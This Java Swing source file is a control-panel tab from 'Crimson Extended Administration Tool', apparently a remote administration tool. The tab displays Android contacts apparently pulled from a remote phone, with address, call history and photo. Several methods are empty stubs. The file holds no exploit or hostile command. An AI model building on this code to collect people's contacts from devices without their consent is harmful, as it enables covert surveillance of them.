package subterranean.crimson.server.graphics.panels.cp.mobile;

/*
 * 	Crimson Extended Administration Tool
 *  Copyright (C) 2015 Subterranean Security
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <http://www.gnu.org/licenses/>.
 * 
 */

import java.awt.BorderLayout;
import java.awt.Image;
import java.util.ArrayList;
import java.util.Date;

import javax.swing.ImageIcon;
import javax.swing.JLabel;
import javax.swing.JList;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.ListSelectionModel;
import javax.swing.event.ListSelectionEvent;
import javax.swing.event.ListSelectionListener;

import subterranean.crimson.server.graphics.ControlPanel;
import subterranean.crimson.server.graphics.DataViewer;
import subterranean.crimson.server.graphics.models.list.ContactList;
import subterranean.crimson.server.graphics.panels.cp.CPanel;
import subterranean.crimson.universal.containers.AndroidContact;

public class Contacts extends CPanel {

	private static final long serialVersionUID = 1L;
	private DataViewer dv;
	private JList list;
	private JLabel photo_label;
	private ContactList cl;

	/**
	 * Create the panel.
	 */
	public Contacts(ControlPanel cp) {
		setLayout(new BorderLayout(0, 0));

		JSplitPane splitPane = new JSplitPane();
		add(splitPane);

		JPanel panel = new JPanel();
		splitPane.setLeftComponent(panel);
		panel.setLayout(new BorderLayout(0, 0));

		JScrollPane scrollPane = new JScrollPane();
		panel.add(scrollPane, BorderLayout.CENTER);

		list = new JList();
		list.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
		list.addListSelectionListener(new ListSelectionListener() {
			public void valueChanged(ListSelectionEvent arg0) {
				if (list.getSelectedValue() == null) {
					return;
				}
				AndroidContact contact = (AndroidContact) list.getSelectedValue();

				if (contact.getPhoto() != null) {
					ImageIcon image = new ImageIcon(contact.getPhoto());
					Image img = image.getImage();
					Image newimg = img.getScaledInstance(145, 145, java.awt.Image.SCALE_SMOOTH);
					photo_label.setIcon(new ImageIcon(newimg));
					photo_label.setBounds(photo_label.getX(), photo_label.getY(), 145, 145);
				}

				// extract values and put into the table
				String[] headers = { "Property", "Value" };
				ArrayList<String[]> val = new ArrayList<String[]>();
				val.add(new String[] { "Name", contact.getName() });
				val.add(new String[] { "ID", "" + contact.getId() });
				val.add(new String[] { "Address Type", "" + contact.getAddressType() });
				val.add(new String[] { "City", contact.getCity() });
				val.add(new String[] { "Country", contact.getCountry() });
				val.add(new String[] { "Zipcode", contact.getZipcode() });
				val.add(new String[] { "Region", contact.getRegion() });
				val.add(new String[] { "Street", contact.getStreet() });
				val.add(new String[] { "Last Contact", new Date(contact.getLastContactTime()).toString() });
				val.add(new String[] { "Times Contacted", "" + contact.getTimesContacted() });

				dv.setList(val);
				dv.setHeaders(headers);

			}
		});
		cl = new ContactList();
		// add to the model
//		for (AndroidContact a : ac) {
//			cl.addElement(a);
//		}
		list.setModel(cl);
		scrollPane.setViewportView(list);

		JPanel panel_1 = new JPanel();
		splitPane.setRightComponent(panel_1);
		panel_1.setLayout(new BorderLayout(0, 0));

		dv = new DataViewer();
		panel_1.add(dv, BorderLayout.CENTER);

		JPanel panel_2 = new JPanel();
		dv.add(panel_2, BorderLayout.NORTH);

		photo_label = new JLabel("");
		panel_2.add(photo_label);

		JMenuBar menuBar = new JMenuBar();
		panel_1.add(menuBar, BorderLayout.NORTH);

		JMenuItem mntmRefresh = new JMenuItem("Refresh");
		menuBar.add(mntmRefresh);
		splitPane.setDividerLocation(200);

	}

	@Override
	public void changedConnectionState(boolean connected) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void refresh() {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void deinitialize() {
		// TODO Auto-generated method stub
		
	}

	@Override
	public String getPanelName() {
		// TODO Auto-generated method stub
		return null;
	}
}
